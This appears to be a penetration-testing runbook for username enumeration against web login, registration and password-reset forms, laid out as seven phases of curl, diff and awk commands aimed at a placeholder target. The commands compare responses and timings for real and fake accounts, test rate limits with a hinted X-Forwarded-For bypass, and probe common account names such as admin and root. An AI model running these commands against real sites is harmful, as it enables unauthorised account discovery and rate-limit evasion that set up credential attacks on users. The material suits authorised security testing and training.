# Workflow playbook — the whole pass as a runbook

## The seven phases, with the commands

```bash
BASE="https://target"; KNOWN="myaccount"; FAKE="zzz-NOSUCH"

# P1 inventory + direct oracle
for ep in /api/username-available /api/check-username; do
  curl -s "$BASE$ep?u=$KNOWN"; curl -s "$BASE$ep?u=$FAKE"; done

# P2 per-form pair
for f in login register forgot-password; do
  curl -i -X POST -d "user=$KNOWN&pass=x" "$BASE/$f" > g_$f
  curl -i -X POST -d "user=$FAKE&pass=x"  "$BASE/$f" > b_$f
done

# P3 channel measurement — body/status/side
for f in login register forgot-password; do
  diff <(sed -E 's/(csrf|nonce|_ts)[^<"& ]*//g' g_$f) <(sed -E 's/(csrf|nonce|_ts)[^<"& ]*//g' b_$f) | head -3
  grep -iE '^HTTP|^location' g_$f b_$f
  diff <(grep -i 'set-cookie' g_$f) <(grep -i 'set-cookie' b_$f)
done

# P4 timing (content-uniform forms)
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d "user=$KNOWN&pass=x" "$BASE/login"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d "user=$FAKE&pass=x"  "$BASE/login"
done | awk '{a[$1]+=$2;c[$1]++}END{print "g",a["g"]/c["g"],"b",a["b"]/c["b"]}'

# P5 throttle
for i in $(seq 15); do curl -s -o /dev/null -w '%{http_code} ' -X POST -d "user=t$i&pass=x" "$BASE/login"; done
# + bypass: -H 'X-Forwarded-For: ...' | fresh session | /api/login | GET | json

# P6 bounded list (scoped only)
for u in admin root test service backup flag; do
  printf '%s: ' "$u"; curl -s "$BASE/api/username-available?u=$u" | head -c 40; echo
done

# P7 record + route
# enum: <form>: <channel>: <delta>  |  throttle: <absent|N|bypass>
# each name -> web-auth-session / web-idor / web-logic-flaw / web-oauth-sso
```

## The phase-exit rule

Each phase ends when its measurement is recorded — the oracle confirmed,
the throttle measured, the list bounded. The pass ends when every form
is oracle-or-uniform and every name is routed. The exploit is the
neighbor class; this pass is the measurement.
